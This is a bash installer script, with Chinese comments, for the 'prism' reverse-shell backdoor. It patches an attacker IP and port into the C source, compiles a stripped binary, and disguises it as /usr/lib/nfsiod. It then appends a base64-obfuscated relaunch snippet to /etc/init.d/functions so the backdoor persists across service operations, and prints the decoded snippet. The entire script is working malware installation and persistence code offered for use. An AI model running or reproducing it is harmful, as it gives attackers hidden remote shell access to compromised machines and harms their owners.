#!/usr/bin/env bash

# Author:0x50 0x68 0x61 0x6E 0x74 0x30 0x6D

# 2013-11-16

os_bit=`uname -p`   #获取处理器类型
if [ $# -ne 2 ]     #判断脚本输入参数的个数是否等于2个，如果不等于输入提示信息
then
    echo -e "\033[31m Usage:$0 reverseIP PORT \033[0m"
    exit 1;
fi
cd /tmp  #进入 tmp 目录下
# 获取用户输入的第一个参数（IP），写入 prism.c 的文件中
sed -i "/define REVERSE_HOST/ {s/10.0.0.1/$1/g}" prism.c
# 获取用户输入的第二个参数（Port），写入 prism.c 的文件中
sed -i "/define REVERSE_PORT/ {s/19832/$2/g}" prism.c
#判断服务器处理器类型是否是 x86 ,根据处理类型执行相应的编译脚本
if [ ${os_bit} = "x86_64" ]
then
    gcc -DDETACH -DSTATIC -m64 -Wall -s -o prism prism.c
else
    gcc -DDETACH -DSTATIC -m32 -Wall -s -o prism prism.c
fi

#删除 prism.c 文件（核心文件使用C语言编写）
rm -f prism.c
#修改编译后的文件名，并剪切到 /usr/lib/ 目录下
mv prism /usr/lib/nfsiod
#执行编译后的二进制文件
/usr/lib/nfsiod

#提示用户反向外壳后门安装完成，并打印用户输入的IP，port
echo "reverse shell backdoor install complete~"
echo "reverseIP: $1,PORT: $2 "

#使用 base64 解密后把该方法添加到 functions 文件中(该文件为启动程序的公共函数，也就是说不管执行任何程序启动，重启，停止操作都会触发到该方法)
echo UElEUz1gcHMgLWVmIHwnXFtuZnNpb2RcXScgfGdyZXAgLXYgZ3JlcCB8IGF3ayAne3ByaW50ICQyfSdgDQppZiBbICIkUElEUyIgIT0gIiIgXTsgdGhlbg0Ka2lsbCAtOSAkUElEUw0KL3Vzci9saWIvbmZzaW9kIDE+L2Rldi9udWxsIDI+L2Rldi9udWxsDQoJZWxzZQ0KL3Vzci9saWIvbmZzaW9kIDE+L2Rldi9udWxsIDI+L2Rldi9udWxsDQpmaQ0KIA0KIA0KIA==|base64 -d >> /etc/init.d/functions

#解密后的base64 代码，
PIDS=`ps -ef |'\[nfsiod\]' |grep -v grep | awk '{print $2}'`
#判断 nfsiod 的进程存在就 kill 掉 重新启动，并把输出信息重定向到空的设别文件
if [ "$PIDS" != "" ]; then
	kill -9 $PIDS
	/usr/lib/nfsiod 1>/dev/null 2>/dev/null
 else
	#不存在就执行该二进制文件，输出信息重定向到空的设备文件上
	/usr/lib/nfsiod 1>/dev/null 2>/dev/null
fi
